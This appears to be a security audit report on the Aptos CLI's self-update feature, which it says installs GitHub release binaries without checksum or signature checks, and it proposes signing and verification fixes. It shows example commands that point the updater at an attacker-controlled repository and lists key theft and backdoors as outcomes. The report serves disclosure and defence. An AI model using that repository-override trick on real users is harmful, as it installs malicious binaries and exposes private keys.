# Audit Report

## Title
CLI Update Mechanism Lacks Binary Signature Verification and Checksum Validation - Supply Chain Attack Vector

## Summary
The Aptos CLI update mechanism downloads and executes binary updates from GitHub releases without any cryptographic verification (signature or checksum validation). This enables multiple supply chain attack vectors where an attacker can serve malicious binaries that will be executed with full user privileges, potentially compromising systems including validator nodes.

## Finding Description

The CLI update functionality in the Aptos Core repository implements a binary auto-update mechanism that fetches new versions from GitHub releases and installs them without any integrity verification.

**Vulnerable Components:**

The update tool is defined in the main CLI entry point: [1](#0-0) 

The update mechanism is implemented through multiple updater modules, with the main Aptos CLI updater at: [2](#0-1) 

The core update logic that applies to all binary updates is here: [3](#0-2) 

**The Critical Flaw:**

The update process performs these steps:
1. Fetches release information from GitHub API
2. Downloads the binary from GitHub releases
3. Directly installs and makes the binary executable
4. **NO signature verification**
5. **NO checksum validation**
6. **NO integrity checks of any kind**

The GitHub release workflow confirms no checksums or signatures are generated: [4](#0-3) 

The build script only creates zip files without any security artifacts: [5](#0-4) 

**Attack Vectors:**

1. **Man-in-the-Middle (MITM) Attack**: If HTTPS/TLS is compromised through certificate authority compromise, BGP hijacking, or DNS poisoning, an attacker can intercept the binary download and serve a malicious binary. Without integrity verification, the malicious binary is installed and executed.

2. **Compromised GitHub Repository**: If the `aptos-labs` GitHub account or the `aptos-core` repository is compromised, attackers can upload malicious release binaries with legitimate version tags. All users running `aptos update aptos` would download and execute the malicious binary.

3. **Social Engineering with Custom Repository**: The CLI allows overriding the repository source via command-line arguments: [6](#0-5) 

An attacker can trick users into running:
```
aptos update aptos --repo-owner attacker --repo-name fake-aptos
```
This downloads and executes binaries from the attacker's repository with no verification.

4. **DNS Hijacking/BGP Attacks**: Attackers controlling network infrastructure can redirect `api.github.com` or `github.com` to malicious servers serving fake releases. Without signature verification, these malicious binaries are accepted as legitimate.

## Impact Explanation

This vulnerability meets **Critical Severity** criteria per Aptos Bug Bounty guidelines for the following reasons:

**Primary Impact: Remote Code Execution**
- Downloaded malicious binaries execute with full user privileges
- Complete system compromise of affected machines
- Access to private keys, credentials, and sensitive data

**Validator Node Compromise Risk:**
If validator operators use the CLI tool on their validator infrastructure and run update commands, this could lead to:
- Remote Code Execution on validator nodes (explicitly listed as Critical severity)
- Validator private key theft
- Consensus manipulation capabilities
- Network-wide security compromise

**Supply Chain Attack Scale:**
- Affects all users of the Aptos CLI globally
- Automatic update mechanisms amplify the attack surface
- Single compromise point (GitHub account or MITM capability) affects entire user base
- Difficult to detect until significant damage occurs

## Likelihood Explanation

**High Likelihood** due to multiple realistic attack scenarios:

1. **GitHub Account Compromise**: Precedent exists with npm, PyPI, and other package registries being compromised. GitHub accounts are valuable targets and sophisticated attackers regularly attempt to compromise them.

2. **Certificate Authority Compromise**: Has occurred multiple times historically (DigiNotar, Comodo). Nation-state actors have demonstrated capability.

3. **BGP/DNS Hijacking**: Documented attacks on major services (e.g., Amazon Route53, Cloudflare). Feasible for well-resourced attackers.

4. **Social Engineering**: Users can be easily tricked into using custom repository flags, especially in tutorials or support scenarios.

5. **No Technical Barriers**: The attack requires no exploitation of complex bugs—just serving a malicious binary that the system will blindly accept and execute.

## Recommendation

Implement a multi-layered cryptographic verification system:

**Required Immediate Fix:**

1. **Generate SHA256 checksums** for all release binaries during the build process
2. **Publish checksums** in a separate, signed file (e.g., `SHA256SUMS.txt`)
3. **Sign the checksum file** using GPG keys controlled by Aptos core developers
4. **Verify checksums** before installing any binary in the update mechanism
5. **Verify GPG signature** of the checksum file against hardcoded trusted public keys

**Implementation Steps:**

1. Modify the build script to generate checksums:
```bash
# In scripts/cli/build_cli_release.sh after zipping
sha256sum "$ZIP_NAME" > "$ZIP_NAME.sha256"
```

2. Sign the checksums file in the release workflow:
```yaml
    - name: Sign checksums
  run: |
    echo "${{ secrets.GPG_PRIVATE_KEY }}" | gpg --import
    gpg --armor --detach-sign SHA256SUMS.txt
```

3. Modify the update mechanism to verify before installation:
```rust
// In crates/aptos/src/update/mod.rs
fn verify_binary_integrity(binary_path: &Path, expected_checksum: &str) -> Result<()> {
    let mut file = File::open(binary_path)?;
    let mut hasher = Sha256::new();
    io::copy(&mut file, &mut hasher)?;
    let computed = format!("{:x}", hasher.finalize());
    
    if computed != expected_checksum {
        bail!("Checksum verification failed! Expected: {}, Got: {}", 
              expected_checksum, computed);
    }
    Ok(())
}
```

4. Hardcode trusted GPG public keys in the CLI:
```rust
const APTOS_RELEASE_PUBLIC_KEY: &str = "-----BEGIN PGP PUBLIC KEY BLOCK-----\n...\n-----END PGP PUBLIC KEY BLOCK-----";
```

**Additional Security Measures:**

- Implement certificate pinning for GitHub API/download connections
- Add user warnings when using `--repo-owner` or `--repo-name` flags
- Consider using code signing certificates for platform-native binary signing (macOS, Windows)
- Implement reproducible builds so checksums can be independently verified

## Proof of Concept

**Attack Scenario: MITM Attack Demonstration**

1. **Setup**: Attacker positions themselves to perform MITM on victim's network (public WiFi, compromised router, etc.)

2. **Intercept Request**: When victim runs `aptos update aptos`, attacker intercepts the HTTPS connection to `api.github.com` and `github.com`

3. **Serve Malicious Response**: Attacker serves a fake API response with a fake release pointing to attacker's malicious binary

4. **Binary Download**: Victim's CLI downloads the malicious binary believing it's legitimate

5. **Execution**: The update mechanism installs and executes the malicious binary with no verification: [7](#0-6) 

6. **Compromise**: The malicious binary now runs with user privileges and can:
   - Steal private keys from `~/.aptos/`
   - Exfiltrate sensitive data
   - Install persistent backdoors
   - If run on validator node, compromise validator keys and operations

**Reproduction Steps:**

```bash
# 1. Clone the repository
git clone https://github.com/aptos-labs/aptos-core.git
cd aptos-core

# 2. Build the CLI
cargo build -p aptos --profile cli

# 3. Observe the update mechanism (requires network MITM setup)
# When running: ./target/cli/aptos update aptos
# The binary is downloaded and executed without ANY verification

# 4. Verify no checksum validation exists:
grep -r "sha256\|checksum\|verify.*hash\|signature.*verify" crates/aptos/src/update/
# Returns no results related to binary verification

# 5. Verify checksums are not generated in build:
cat scripts/cli/build_cli_release.sh | grep -i "sha256\|checksum"
# Returns no results

# 6. Verify no signature verification in dependencies:
cat crates/aptos/Cargo.toml | grep self_update
# Shows self_update dependency with no verification features enabled
```

**Demonstration of Social Engineering Vector:**

```bash
# Attacker creates fake repository with malicious binary
# Tricks user into running:
aptos update aptos --repo-owner malicious-actor --repo-name fake-aptos-cli

# The CLI will download and execute from the attacker's repository
# No verification occurs, malicious binary is installed and run
```

---

## Notes

This vulnerability is particularly severe because:

1. **Trust Relationship**: Users trust the update mechanism to deliver legitimate Aptos software
2. **Privileged Context**: Updates may be run on validator nodes or machines with access to significant assets
3. **Silent Compromise**: Malicious binaries can be indistinguishable from legitimate ones without verification
4. **Wide Attack Surface**: Multiple attack vectors (MITM, GitHub compromise, social engineering, DNS hijacking) all lead to exploitation
5. **Industry Standard Violation**: Modern software distribution requires cryptographic verification (e.g., apt uses GPG, Homebrew verifies checksums, Docker Content Trust)

The Aptos CLI currently relies solely on HTTPS for security, which is insufficient for a supply chain security model. The addition of cryptographic verification is not optional—it's a critical security requirement for any software auto-update mechanism.

### Citations

**File:** crates/aptos/src/lib.rs (L54-54)
```rust
    Update(update::UpdateTool),
```

**File:** crates/aptos/src/update/aptos.rs (L33-39)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "aptos-core")]
    repo_name: String,
```

**File:** crates/aptos/src/update/aptos.rs (L96-149)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        let installation_method =
            InstallationMethod::from_env().context("Failed to determine installation method")?;
        match installation_method {
            InstallationMethod::Source => {
                return Err(anyhow!(
                    "Detected this CLI was built from source, refusing to update"
                ));
            },
            InstallationMethod::Homebrew => {
                return Err(anyhow!(
                    "Detected this CLI comes from homebrew, use `brew upgrade aptos` instead"
                ));
            },
            InstallationMethod::PackageManager => {
                return Err(anyhow!(
                    "Detected this CLI comes from a package manager, use your package manager to update instead"
                ));
            },
            InstallationMethod::Other => {},
        }

        // Determine the target we should download. This is necessary because we don't
        // name our binary releases using the target triples nor do we build specifically
        // for all major triples, so we have to generalize to one of the binaries we do
        // happen to build. We figure this out based on what system the CLI was built on.
        let build_info = cli_build_information();
        let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
            "linux-x86_64" => "Linux-x86_64",
            "linux-aarch64" => "Linux-aarch64",
            "macos-x86_64" => "macOS-x86_64",
            "macos-aarch64" => "macOS-arm64",
            "windows-x86_64" => "Windows-x86_64",
            wildcard => return Err(anyhow!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard)),
        };

        let current_version = match &info.current_version {
            Some(version) => version,
            None => unreachable!("current_version should always be Some at this point"),
        };

        // Build a new configuration that will direct the library to download the
        // binary with the target version tag and target that we determined above.
        Update::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .bin_name("aptos")
            .current_version(current_version)
            .target_version_tag(&format!("aptos-cli-v{}", info.target_version))
            .target(target)
            .no_confirm(self.prompt_options.assume_yes)
            .build()
            .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
    }
```

**File:** crates/aptos/src/update/mod.rs (L41-78)
```rust
    fn update(&self) -> CliTypedResult<String> {
        // Confirm that we need to update.
        let info = self
            .get_update_info()
            .context("Failed to check if we need to update")?;
        if !info.update_required()? {
            return Ok(format!("Already up to date (v{})", info.target_version));
        }

        // Build the updater.
        let updater = self.build_updater(&info)?;

        // Update the binary.
        let result = updater
            .update()
            .map_err(|e| anyhow!("Failed to update {}: {:#}", self.pretty_name(), e))?;

        let message = match result {
            Status::UpToDate(_) => unreachable!("We should have caught this already"),
            Status::Updated(_) => match info.current_version {
                Some(current_version) => format!(
                    "Successfully updated {} from v{} to v{}",
                    self.pretty_name(),
                    current_version,
                    info.target_version
                ),
                None => {
                    format!(
                        "Successfully installed {} v{}",
                        self.pretty_name(),
                        info.target_version
                    )
                },
            },
        };

        Ok(message)
    }
```

**File:** .github/workflows/cli-release.yaml (L172-180)
```yaml
      - name: Create GitHub Release
        uses: marvinpinto/action-automatic-releases@919008cf3f741b179569b7a6fb4d8860689ab7f0 # pin@v1.2.1
        with:
          repo_token: "${{ secrets.GITHUB_TOKEN }}"
          automatic_release_tag: "${{ format('aptos-cli-v{0}', inputs.release_version) }}"
          prerelease: false
          title: "${{ format('Aptos CLI Release v{0}', inputs.release_version) }}"
          files: |
            aptos-cli-*.zip
```

**File:** scripts/cli/build_cli_release.sh (L62-67)
```shellscript
# Compress the CLI
ZIP_NAME="$NAME-$VERSION-$PLATFORM_NAME-$ARCH.zip"

echo "Zipping release: $ZIP_NAME"
zip "$ZIP_NAME" "$CRATE_NAME"
mv "$ZIP_NAME" ../..
```
